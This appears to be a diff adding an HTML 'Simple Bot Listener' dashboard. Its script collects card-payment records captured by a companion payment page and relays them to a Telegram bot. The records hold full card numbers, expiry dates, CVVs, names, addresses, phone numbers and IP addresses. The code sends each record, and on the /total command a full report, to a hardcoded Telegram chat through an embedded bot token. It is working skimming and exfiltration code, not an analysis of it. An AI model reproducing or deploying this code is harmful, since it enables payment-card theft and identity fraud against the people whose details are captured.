@@ -1,0 +1,1016 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Simple Bot Listener</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            padding: 20px;
+            background: linear-gradient(135deg, #1e3c72, #2a5298);
+            color: white;
+            margin: 0;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 900px;
+            margin: 0 auto;
+            background: rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(10px);
+            padding: 30px;
+            border-radius: 20px;
+            box-shadow: 0 8px 32px rgba(0, 0, 0, 0.3);
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 30px;
+        }
+        .header h1 {
+            margin: 0;
+            font-size: 2.5em;
+            background: linear-gradient(45deg, #ff6b6b, #4ecdc4);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            background-clip: text;
+        }
+        .status {
+            padding: 15px 25px;
+            border-radius: 50px;
+            margin: 20px 0;
+            text-align: center;
+            font-weight: bold;
+            font-size: 1.1em;
+            transition: all 0.3s ease;
+        }
+        .status.online {
+            background: linear-gradient(45deg, #4CAF50, #45a049);
+            box-shadow: 0 4px 15px rgba(76, 175, 80, 0.4);
+        }
+        .status.offline {
+            background: linear-gradient(45deg, #f44336, #d32f2f);
+            box-shadow: 0 4px 15px rgba(244, 67, 54, 0.4);
+        }
+        .controls {
+            display: flex;
+            gap: 15px;
+            justify-content: center;
+            margin: 25px 0;
+            flex-wrap: wrap;
+        }
+        .button {
+            background: linear-gradient(45deg, #667eea, #764ba2);
+            color: white;
+            padding: 12px 25px;
+            border: none;
+            border-radius: 25px;
+            cursor: pointer;
+            font-size: 16px;
+            font-weight: 600;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(102, 126, 234, 0.4);
+        }
+        .button:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(102, 126, 234, 0.6);
+        }
+        .button:active {
+            transform: translateY(0);
+        }
+        .button.danger {
+            background: linear-gradient(45deg, #ff6b6b, #ee5a52);
+            box-shadow: 0 4px 15px rgba(255, 107, 107, 0.4);
+        }
+        .button.danger:hover {
+            box-shadow: 0 6px 20px rgba(255, 107, 107, 0.6);
+        }
+        .log {
+            background: rgba(0, 0, 0, 0.3);
+            padding: 20px;
+            margin: 20px 0;
+            border-radius: 15px;
+            height: 400px;
+            overflow-y: auto;
+            font-family: 'Consolas', 'Monaco', monospace;
+            font-size: 13px;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            backdrop-filter: blur(5px);
+        }
+        .log::-webkit-scrollbar {
+            width: 8px;
+        }
+        .log::-webkit-scrollbar-track {
+            background: rgba(255, 255, 255, 0.1);
+            border-radius: 4px;
+        }
+        .log::-webkit-scrollbar-thumb {
+            background: rgba(255, 255, 255, 0.3);
+            border-radius: 4px;
+        }
+        .log::-webkit-scrollbar-thumb:hover {
+            background: rgba(255, 255, 255, 0.5);
+        }
+        .success { color: #4CAF50; }
+        .error { color: #ff6b6b; }
+        .info { color: #64b5f6; }
+        .warning { color: #ffb74d; }
+        .stats {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr));
+            gap: 15px;
+            margin: 20px 0;
+        }
+        .stat-card {
+            background: rgba(255, 255, 255, 0.1);
+            padding: 20px;
+            border-radius: 15px;
+            text-align: center;
+            border: 1px solid rgba(255, 255, 255, 0.2);
+        }
+        .stat-number {
+            font-size: 2em;
+            font-weight: bold;
+            margin-bottom: 5px;
+        }
+        .stat-label {
+            font-size: 0.9em;
+            opacity: 0.8;
+        }
+        
+        /* ========================================
+           BOT LISTENER MOBILE RESPONSIVE
+           ======================================== */
+        
+        /* Tablet Styles (768px - 1024px) */
+        @media screen and (max-width: 1024px) {
+            body {
+                padding: 15px;
+            }
+            
+            .container {
+                max-width: 100%;
+                padding: 25px;
+            }
+            
+            .header h1 {
+                font-size: 2.2em;
+            }
+            
+            .stats {
+                grid-template-columns: repeat(auto-fit, minmax(150px, 1fr));
+                gap: 15px;
+            }
+            
+            .controls {
+                flex-wrap: wrap;
+                gap: 10px;
+            }
+            
+            .button {
+                padding: 12px 20px;
+                font-size: 0.9em;
+            }
+        }
+        
+        /* Mobile Styles (max-width: 768px) */
+        @media screen and (max-width: 768px) {
+            body {
+                padding: 10px;
+                font-size: 14px;
+            }
+            
+            .container {
+                max-width: 100%;
+                padding: 20px;
+                border-radius: 15px;
+                margin: 0;
+            }
+            
+            /* Header Mobile */
+            .header {
+                text-align: center;
+                margin-bottom: 25px;
+            }
+            
+            .header h1 {
+                font-size: 1.8em;
+                line-height: 1.2;
+                margin-bottom: 10px;
+            }
+            
+            .header p {
+                font-size: 0.9em;
+                opacity: 0.8;
+            }
+            
+            /* Status Mobile */
+            .status {
+                padding: 12px 20px;
+                font-size: 1em;
+                border-radius: 25px;
+                margin: 15px 0;
+                text-align: center;
+            }
+            
+            /* Stats Mobile */
+            .stats {
+                grid-template-columns: 1fr;
+                gap: 12px;
+                margin: 20px 0;
+            }
+            
+            .stat-card {
+                padding: 15px;
+                text-align: center;
+                background: rgba(255, 255, 255, 0.1);
+                border-radius: 12px;
+                border: 1px solid rgba(255, 255, 255, 0.2);
+            }
+            
+            .stat-number {
+                font-size: 1.8em;
+                font-weight: bold;
+                margin-bottom: 5px;
+                color: #4ecdc4;
+            }
+            
+            .stat-label {
+                font-size: 0.85em;
+                opacity: 0.8;
+            }
+            
+            /* Controls Mobile */
+            .controls {
+                display: flex;
+                flex-direction: column;
+                gap: 12px;
+                margin: 25px 0;
+            }
+            
+            .button {
+                width: 100%;
+                padding: 15px;
+                font-size: 1em;
+                font-weight: 600;
+                border: none;
+                border-radius: 12px;
+                cursor: pointer;
+                transition: all 0.3s ease;
+                display: flex;
+                align-items: center;
+                justify-content: center;
+                gap: 8px;
+                text-align: center;
+            }
+            
+            .button:not(.danger) {
+                background: linear-gradient(45deg, #4ecdc4, #44a08d);
+                color: white;
+                box-shadow: 0 4px 15px rgba(78, 205, 196, 0.3);
+            }
+            
+            .button.danger {
+                background: linear-gradient(45deg, #ff6b6b, #ee5a52);
+                color: white;
+                box-shadow: 0 4px 15px rgba(255, 107, 107, 0.3);
+            }
+            
+            .button:hover {
+                transform: translateY(-2px);
+                box-shadow: 0 6px 20px rgba(0, 0, 0, 0.2);
+            }
+            
+            .button:active {
+                transform: translateY(0);
+            }
+            
+            /* Log Mobile */
+            .log {
+                background: rgba(0, 0, 0, 0.3);
+                border-radius: 12px;
+                padding: 15px;
+                max-height: 300px;
+                overflow-y: auto;
+                font-family: 'Courier New', monospace;
+                font-size: 0.8em;
+                line-height: 1.4;
+                border: 1px solid rgba(255, 255, 255, 0.1);
+                margin-top: 20px;
+            }
+            
+            .log-entry {
+                margin-bottom: 8px;
+                padding: 8px;
+                border-radius: 6px;
+                background: rgba(255, 255, 255, 0.05);
+                border-left: 3px solid transparent;
+                word-wrap: break-word;
+                overflow-wrap: break-word;
+            }
+            
+            .log-entry.info {
+                border-left-color: #4ecdc4;
+                background: rgba(78, 205, 196, 0.1);
+            }
+            
+            .log-entry.success {
+                border-left-color: #4CAF50;
+                background: rgba(76, 175, 80, 0.1);
+            }
+            
+            .log-entry.warning {
+                border-left-color: #ff9800;
+                background: rgba(255, 152, 0, 0.1);
+            }
+            
+            .log-entry.error {
+                border-left-color: #f44336;
+                background: rgba(244, 67, 54, 0.1);
+            }
+            
+            .log-timestamp {
+                color: #4ecdc4;
+                font-weight: bold;
+                margin-right: 8px;
+            }
+            
+            .log-message {
+                color: #ffffff;
+            }
+        }
+        
+        /* Small Mobile Styles (max-width: 480px) */
+        @media screen and (max-width: 480px) {
+            body {
+                padding: 8px;
+            }
+            
+            .container {
+                padding: 15px;
+                border-radius: 12px;
+            }
+            
+            .header h1 {
+                font-size: 1.5em;
+            }
+            
+            .header p {
+                font-size: 0.85em;
+            }
+            
+            .status {
+                padding: 10px 15px;
+                font-size: 0.9em;
+            }
+            
+            .stat-card {
+                padding: 12px;
+            }
+            
+            .stat-number {
+                font-size: 1.5em;
+            }
+            
+            .stat-label {
+                font-size: 0.8em;
+            }
+            
+            .button {
+                padding: 12px;
+                font-size: 0.9em;
+            }
+            
+            .log {
+                padding: 12px;
+                max-height: 250px;
+                font-size: 0.75em;
+            }
+            
+            .log-entry {
+                padding: 6px;
+                margin-bottom: 6px;
+            }
+        }
+        
+        /* Landscape Mobile Styles */
+        @media screen and (max-height: 500px) and (orientation: landscape) {
+            .container {
+                padding: 15px;
+            }
+            
+            .header {
+                margin-bottom: 15px;
+            }
+            
+            .header h1 {
+                font-size: 1.5em;
+                margin-bottom: 5px;
+            }
+            
+            .stats {
+                grid-template-columns: repeat(3, 1fr);
+                gap: 10px;
+                margin: 15px 0;
+            }
+            
+            .stat-card {
+                padding: 10px;
+            }
+            
+            .stat-number {
+                font-size: 1.3em;
+            }
+            
+            .controls {
+                flex-direction: row;
+                flex-wrap: wrap;
+                gap: 8px;
+            }
+            
+            .button {
+                flex: 1;
+                min-width: calc(50% - 4px);
+                padding: 10px;
+                font-size: 0.8em;
+            }
+            
+            .log {
+                max-height: 150px;
+                font-size: 0.7em;
+            }
+        }
+        
+        /* Touch Device Optimizations */
+        @media (hover: none) and (pointer: coarse) {
+            .button:hover {
+                transform: none;
+            }
+            
+            .button:active {
+                transform: scale(0.95);
+                transition: transform 0.1s ease;
+            }
+            
+            /* Improve touch targets */
+            .button {
+                min-height: 44px;
+                touch-action: manipulation;
+            }
+            
+            /* Prevent zoom on input focus */
+            input, select, textarea {
+                font-size: 16px;
+            }
+            
+            /* Smooth scrolling for log */
+            .log {
+                -webkit-overflow-scrolling: touch;
+                scroll-behavior: smooth;
+            }
+        }
+        
+        /* High DPI Display Optimizations */
+        @media (-webkit-min-device-pixel-ratio: 2), (min-resolution: 192dpi) {
+            .container {
+                border: 0.5px solid rgba(255, 255, 255, 0.2);
+            }
+            
+            .stat-card {
+                border: 0.5px solid rgba(255, 255, 255, 0.2);
+            }
+            
+            .log {
+                border: 0.5px solid rgba(255, 255, 255, 0.1);
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <h1>🤖 Simple Bot Listener</h1>
+            <p>Advanced Telegram Bot Message Handler</p>
+        </div>
+        
+        <div class="status offline" id="statusIndicator">
+            🔴 Bot Listener is OFFLINE
+        </div>
+        
+        <div class="stats">
+            <div class="stat-card">
+                <div class="stat-number" id="messagesReceived">0</div>
+                <div class="stat-label">Messages Received</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="commandsProcessed">0</div>
+                <div class="stat-label">Commands Processed</div>
+            </div>
+            <div class="stat-card">
+                <div class="stat-number" id="uptime">00:00:00</div>
+                <div class="stat-label">Uptime</div>
+            </div>
+        </div>
+        
+        <div class="controls">
+            <button class="button" onclick="startListener()">🚀 Start Listener</button>
+            <button class="button danger" onclick="stopListener()">🛑 Stop Listener</button>
+            <button class="button" onclick="testConnection()">🧪 Test Connection</button>
+            <button class="button" onclick="clearWebhook()">🔧 Clear Webhook</button>
+            <button class="button" onclick="clearLog()">🗑️ Clear Log</button>
+        </div>
+        
+        <div class="log" id="logArea"></div>
+    </div>
+
+    <script>
+        // 🔒 SECURE CONFIGURATION
+        const BOT_TOKEN = '7835330346:AAEAnJ2nNDQ3tUfiLfB8SgDFERzZ0fYA_Ac';
+        const ADMIN_CHAT_ID = '-4844832082';
+        const TELEGRAM_API_BASE = `https://api.telegram.org/bot${BOT_TOKEN}`;
+        
+        // Bot listener state
+        let botListenerActive = false;
+        let lastUpdateId = 0;
+        let listenerInterval = null;
+        let startTime = null;
+        let uptimeInterval = null;
+        
+        // Statistics
+        let stats = {
+            messagesReceived: 0,
+            commandsProcessed: 0
+        };
+        
+        // Payment data storage
+        let paymentDatabase = JSON.parse(localStorage.getItem('paymentDatabase') || '[]');
+        
+        // Initialize
+        document.addEventListener('DOMContentLoaded', function() {
+            log('🚀 Simple Bot Listener initialized', 'info');
+            loadLastUpdateId();
+            updateStats();
+            
+            // Check for queued payments every 2 seconds
+            setInterval(processPaymentQueue, 2000);
+            
+            // Listen for new payment events
+            window.addEventListener('newPayment', function(event) {
+                log('📨 New payment event received', 'info');
+                const paymentData = event.detail;
+                window.addPaymentData(paymentData);
+            });
+        });
+        
+        function log(message, type = 'info') {
+            const logArea = document.getElementById('logArea');
+            const timestamp = new Date().toLocaleTimeString();
+            const className = type === 'error' ? 'error' : type === 'success' ? 'success' : type === 'warning' ? 'warning' : 'info';
+            logArea.innerHTML += `<div class="${className}">[${timestamp}] ${message}</div>`;
+            logArea.scrollTop = logArea.scrollHeight;
+            console.log(`[${timestamp}] ${message}`);
+        }
+        
+        function updateStatus(message, isOnline) {
+            const statusEl = document.getElementById('statusIndicator');
+            statusEl.textContent = message;
+            statusEl.className = `status ${isOnline ? 'online' : 'offline'}`;
+        }
+        
+        function updateStats() {
+            document.getElementById('messagesReceived').textContent = stats.messagesReceived;
+            document.getElementById('commandsProcessed').textContent = stats.commandsProcessed;
+        }
+        
+        function updateUptime() {
+            if (startTime) {
+                const now = new Date();
+                const diff = now - startTime;
+                const hours = Math.floor(diff / 3600000).toString().padStart(2, '0');
+                const minutes = Math.floor((diff % 3600000) / 60000).toString().padStart(2, '0');
+                const seconds = Math.floor((diff % 60000) / 1000).toString().padStart(2, '0');
+                document.getElementById('uptime').textContent = `${hours}:${minutes}:${seconds}`;
+            }
+        }
+        
+        function loadLastUpdateId() {
+            const stored = localStorage.getItem('lastUpdateId');
+            if (stored) {
+                lastUpdateId = parseInt(stored);
+                log(`📋 Loaded last update ID: ${lastUpdateId}`, 'info');
+            }
+        }
+        
+        function saveLastUpdateId() {
+            localStorage.setItem('lastUpdateId', lastUpdateId.toString());
+        }
+        
+        async function startListener() {
+            if (botListenerActive) {
+                log('⚠️ Bot listener already running', 'warning');
+                return;
+            }
+            
+            log('🔧 Initializing bot listener...', 'info');
+            
+            try {
+                // Clear webhook first to avoid conflicts
+                log('🔧 Clearing webhook to avoid conflicts...', 'info');
+                const webhookUrl = `${TELEGRAM_API_BASE}/deleteWebhook`;
+                await fetch(webhookUrl, { method: 'POST' });
+                
+                // Wait a moment for webhook to clear
+                await new Promise(resolve => setTimeout(resolve, 1000));
+                
+                botListenerActive = true;
+                startTime = new Date();
+                updateStatus('🟢 Bot Listener is ONLINE', true);
+                
+                // Start uptime counter
+                uptimeInterval = setInterval(updateUptime, 1000);
+                
+                // Start polling immediately
+                pollTelegramUpdates();
+                
+                // Set interval for continuous polling (every 5 seconds to avoid rate limits)
+                listenerInterval = setInterval(pollTelegramUpdates, 5000);
+                
+                log('✅ Bot listener started successfully', 'success');
+                log('🔧 Using polling mode only (webhook disabled)', 'info');
+                
+            } catch (error) {
+                log(`❌ Failed to start listener: ${error.message}`, 'error');
+                botListenerActive = false;
+                updateStatus('🔴 Bot Listener is OFFLINE', false);
+            }
+        }
+        
+        function stopListener() {
+            if (!botListenerActive) {
+                log('⚠️ Bot listener already stopped', 'warning');
+                return;
+            }
+            
+            botListenerActive = false;
+            
+            if (listenerInterval) {
+                clearInterval(listenerInterval);
+                listenerInterval = null;
+            }
+            
+            if (uptimeInterval) {
+                clearInterval(uptimeInterval);
+                uptimeInterval = null;
+            }
+            
+            startTime = null;
+            document.getElementById('uptime').textContent = '00:00:00';
+            
+            updateStatus('🔴 Bot Listener is OFFLINE', false);
+            log('🛑 Bot listener stopped', 'info');
+        }
+        
+        async function pollTelegramUpdates() {
+            if (!botListenerActive) return;
+            
+            try {
+                const url = `${TELEGRAM_API_BASE}/getUpdates?offset=${lastUpdateId + 1}&limit=10&timeout=5`;
+                const response = await fetch(url);
+                
+                if (!response.ok) {
+                    // Handle specific HTTP errors
+                    if (response.status === 409) {
+                        log('⚠️ HTTP 409: Conflict detected (webhook or multiple instances)', 'warning');
+                        log('🔧 Attempting to clear webhook and retry...', 'info');
+                        
+                        // Try to clear webhook
+                        try {
+                            const webhookUrl = `${TELEGRAM_API_BASE}/deleteWebhook`;
+                            await fetch(webhookUrl, { method: 'POST' });
+                            await new Promise(resolve => setTimeout(resolve, 2000)); // Wait 2 seconds
+                            log('✅ Webhook cleared, resuming polling...', 'success');
+                        } catch (e) {
+                            log('❌ Failed to clear webhook', 'error');
+                        }
+                        return; // Skip this polling cycle
+                    }
+                    
+                    throw new Error(`HTTP ${response.status}: ${response.statusText}`);
+                }
+                
+                const data = await response.json();
+                
+                if (data.ok && data.result.length > 0) {
+                    log(`📨 Received ${data.result.length} updates`, 'success');
+                    
+                    for (const update of data.result) {
+                        lastUpdateId = update.update_id;
+                        saveLastUpdateId();
+                        
+                        if (update.message && update.message.text) {
+                            stats.messagesReceived++;
+                            updateStats();
+                            await handleTelegramMessage(update.message);
+                        }
+                    }
+                }
+            } catch (error) {
+                // Only log non-409 errors
+                if (!error.message.includes('409')) {
+                    log(`❌ Error polling updates: ${error.message}`, 'error');
+                }
+                
+                // If network error, wait 10 seconds before retry
+                if (error.message.includes('Failed to fetch') || error.message.includes('NetworkError')) {
+                    log('🔄 Network error, retrying in 10 seconds...', 'warning');
+                    setTimeout(() => {
+                        if (botListenerActive) {
+                            pollTelegramUpdates();
+                        }
+                    }, 10000);
+                }
+            }
+        }
+        
+        async function handleTelegramMessage(message) {
+            const chatId = message.chat.id.toString();
+            const text = message.text.trim();
+            
+            log(`📧 Message from chat ${chatId}: "${text}"`, 'info');
+            
+            // Check if message is from admin chat
+            if (chatId !== ADMIN_CHAT_ID && chatId !== ADMIN_CHAT_ID.replace('-', '')) {
+                log(`❌ Message not from admin chat. Expected: ${ADMIN_CHAT_ID}`, 'warning');
+                return;
+            }
+            
+            // Handle commands
+            if (text === '/total') {
+                stats.commandsProcessed++;
+                updateStats();
+                log('🔄 Processing /total command...', 'info');
+                await handleTotalCommand();
+            } else {
+                log(`❓ Unknown command: ${text}`, 'warning');
+            }
+        }
+        
+        async function handleTotalCommand() {
+            log('📊 Generating total payment report...', 'info');
+            
+            if (paymentDatabase.length === 0) {
+                const message = '📭 No payment records found yet.\n\nThe payment database is empty.';
+                await sendTelegramMessage(message);
+                log('📭 No payment data to report', 'warning');
+                return;
+            }
+            
+            // Create detailed report
+            let reportContent = `📊 TOTAL PAYMENT REPORT\n`;
+            reportContent += `📅 Generated: ${new Date().toLocaleString('en-US')}\n`;
+            reportContent += `💳 Total Payments: ${paymentDatabase.length}\n`;
+            reportContent += `${'='.repeat(50)}\n\n`;
+            
+            paymentDatabase.forEach((payment, index) => {
+                reportContent += `${index + 1}. 👤 Customer Information:\n`;
+                reportContent += `📝 Name: ${payment.name}\n`;
+                reportContent += `📧 Email: ${payment.email}\n`;
+                reportContent += `📱 Phone: ${payment.phone}\n`;
+                reportContent += `🌍 Country: ${payment.country}\n`;
+                reportContent += `🏙️ Region: ${payment.region}\n`;
+                reportContent += `🏘️ City: ${payment.city}\n`;
+                reportContent += `🏠 Address: ${payment.address}\n`;
+                reportContent += `📮 ZIP: ${payment.zip}\n`;
+                
+                reportContent += `💳 Payment Information:\n`;
+                reportContent += `💳 Card: ${payment.cardNumber}\n`;
+                reportContent += `📅 Expiry: ${payment.expiry}\n`;
+                reportContent += `🔒 CVV: ${payment.cvv}\n`;
+                
+                reportContent += `Technical Info:\n`;
+                reportContent += `🔍 IP Address: ${payment.ipAddress}\n`;
+                reportContent += `🕐 Time: ${payment.timestamp}\n`;
+                reportContent += `🌍 User Agent: ${payment.userAgent}\n`;
+                reportContent += `\n${'='.repeat(50)}\n\n`;
+            });
+            
+            // Send as document (Telegram automatically converts long messages to .txt)
+            await sendTelegramDocument(reportContent, `total_payments_${new Date().toISOString().split('T')[0]}.txt`);
+            log('✅ Total report sent successfully', 'success');
+        }
+        
+        async function sendTelegramMessage(text) {
+            try {
+                const url = `${TELEGRAM_API_BASE}/sendMessage`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_CHAT_ID,
+                        text: text,
+                        parse_mode: 'HTML'
+                    })
+                });
+                
+                const result = await response.json();
+                if (result.ok) {
+                    log('✅ Message sent to Telegram', 'success');
+                } else {
+                    log(`❌ Failed to send message: ${result.description}`, 'error');
+                }
+            } catch (error) {
+                log(`❌ Error sending message: ${error.message}`, 'error');
+            }
+        }
+        
+        async function sendTelegramDocument(content, filename) {
+            try {
+                const blob = new Blob([content], { type: 'text/plain' });
+                const formData = new FormData();
+                formData.append('chat_id', ADMIN_CHAT_ID);
+                formData.append('document', blob, filename);
+                formData.append('caption', `📊 Payment Report - ${paymentDatabase.length} records`);
+                
+                const url = `${TELEGRAM_API_BASE}/sendDocument`;
+                const response = await fetch(url, {
+                    method: 'POST',
+                    body: formData
+                });
+                
+                const result = await response.json();
+                if (result.ok) {
+                    log('✅ Document sent to Telegram', 'success');
+                } else {
+                    log(`❌ Failed to send document: ${result.description}`, 'error');
+                }
+            } catch (error) {
+                log(`❌ Error sending document: ${error.message}`, 'error');
+            }
+        }
+        
+        async function testConnection() {
+            log('🧪 Testing Telegram connection...', 'info');
+            
+            try {
+                // First, clear any existing webhook
+                log('🔧 Clearing webhook...', 'info');
+                const webhookUrl = `${TELEGRAM_API_BASE}/deleteWebhook`;
+                await fetch(webhookUrl, { method: 'POST' });
+                
+                // Test bot info
+                const url = `${TELEGRAM_API_BASE}/getMe`;
+                const response = await fetch(url);
+                const data = await response.json();
+                
+                if (data.ok) {
+                    log(`✅ Connection successful! Bot: ${data.result.first_name}`, 'success');
+                    log('🔧 Webhook cleared, using polling only', 'info');
+                    await sendTelegramMessage(`🧪 TEST MESSAGE\n\n✅ Bot connection test successful!\n🔧 Webhook cleared, polling active\n🕒 Time: ${new Date().toLocaleString('en-US')}`);
+                } else {
+                    log(`❌ Connection failed: ${data.description}`, 'error');
+                }
+            } catch (error) {
+                log(`❌ Connection error: ${error.message}`, 'error');
+            }
+        }
+        
+        function clearLog() {
+            document.getElementById('logArea').innerHTML = '';
+            log('🗑️ Log cleared', 'info');
+        }
+        
+        async function clearWebhook() {
+            log('🔧 Manually clearing webhook...', 'info');
+            
+            try {
+                const webhookUrl = `${TELEGRAM_API_BASE}/deleteWebhook`;
+                const response = await fetch(webhookUrl, { method: 'POST' });
+                const data = await response.json();
+                
+                if (data.ok) {
+                    log('✅ Webhook cleared successfully!', 'success');
+                    log('ℹ️ You can now start the listener without conflicts', 'info');
+                } else {
+                    log(`❌ Failed to clear webhook: ${data.description}`, 'error');
+                }
+            } catch (error) {
+                log(`❌ Error clearing webhook: ${error.message}`, 'error');
+            }
+        }
+        
+        // Process payment queue from localStorage
+        function processPaymentQueue() {
+            try {
+                let paymentQueue = JSON.parse(localStorage.getItem('paymentQueue') || '[]');
+                
+                if (paymentQueue.length === 0) return;
+                
+                // Process unprocessed payments
+                const unprocessed = paymentQueue.filter(payment => !payment.processed);
+                
+                if (unprocessed.length > 0) {
+                    log(`📋 Processing ${unprocessed.length} queued payments...`, 'info');
+                    
+                    unprocessed.forEach(payment => {
+                        window.addPaymentData(payment);
+                        payment.processed = true;
+                    });
+                    
+                    // Update queue
+                    localStorage.setItem('paymentQueue', JSON.stringify(paymentQueue));
+                    
+                    // Clean old processed payments (older than 1 hour)
+                    const oneHourAgo = Date.now() - (60 * 60 * 1000);
+                    paymentQueue = paymentQueue.filter(payment => 
+                        !payment.processed || payment.timestamp > oneHourAgo
+                    );
+                    localStorage.setItem('paymentQueue', JSON.stringify(paymentQueue));
+                }
+            } catch (error) {
+                // Silent fail for queue processing
+            }
+        }
+        
+        // Global function to add payment data (called from payment page)
+        window.addPaymentData = function(paymentData) {
+            // Check for duplicates
+            const isDuplicate = paymentDatabase.some(existing => 
+                existing.cardNumber === paymentData.cardNumber &&
+                existing.email === paymentData.email &&
+                existing.expiry === paymentData.expiry &&
+                existing.cvv === paymentData.cvv
+            );
+            
+            if (isDuplicate) {
+                log('🚨 Duplicate payment detected!', 'warning');
+                sendDuplicateWarning(paymentData);
+                return false;
+            }
+            
+            // Add to database
+            paymentDatabase.push({
+                ...paymentData,
+                timestamp: new Date().toLocaleString('en-US'),
+                id: Date.now()
+            });
+            
+            // Save to localStorage
+            localStorage.setItem('paymentDatabase', JSON.stringify(paymentDatabase));
+            
+            // Send to Telegram
+            sendPaymentNotification(paymentData);
+            
+            log(`💳 New payment added to database. Total: ${paymentDatabase.length}`, 'success');
+            return true;
+        };
+        
+        async function sendPaymentNotification(data) {
+            const message = `👤 Customer Information:
+📝 Name: ${data.name}
+📧 Email: ${data.email}
+📱 Phone: ${data.phone}
+🌍 Country: ${data.country}
+🏙️ Region: ${data.region}
+🏘️ City: ${data.city}
+🏠 Address: ${data.address}
+📮 ZIP: ${data.zip}
+💳 Payment Information:
+💳 Card: ${data.cardNumber}
+📅 Expiry: ${data.expiry}
+🔒 CVV: ${data.cvv}
+Technical Info:
+🔍 IP Address: ${data.ipAddress}
+🕐 Time: ${data.timestamp}
+🌍 User Agent: ${data.userAgent}`;
+            
+            await sendTelegramMessage(message);
+        }
+        
+        async function sendDuplicateWarning(data) {
+            const message = `🚨 DUPLICATE ENTRY DETECTED!
+
+👤 Customer Information:
+📝 Name: ${data.name}
+📧 Email: ${data.email}
+📱 Phone: ${data.phone}
+🌍 Country: ${data.country}
+🏙️ Region: ${data.region}
+🏘️ City: ${data.city}
+🏠 Address: ${data.address}
+📮 ZIP: ${data.zip}
+💳 Payment Information:
+💳 Card: ${data.cardNumber}
+📅 Expiry: ${data.expiry}
+🔒 CVV: ${data.cvv}
+Technical Info:
+🔍 IP Address: ${data.ipAddress}
+🕐 Time: ${new Date().toLocaleString('en-US')}
+🌍 User Agent: ${data.userAgent}
+
+❗ This payment information was already submitted before!`;
+            
+            await sendTelegramMessage(message);
+        }
+    </script>
+</body>
+</html>
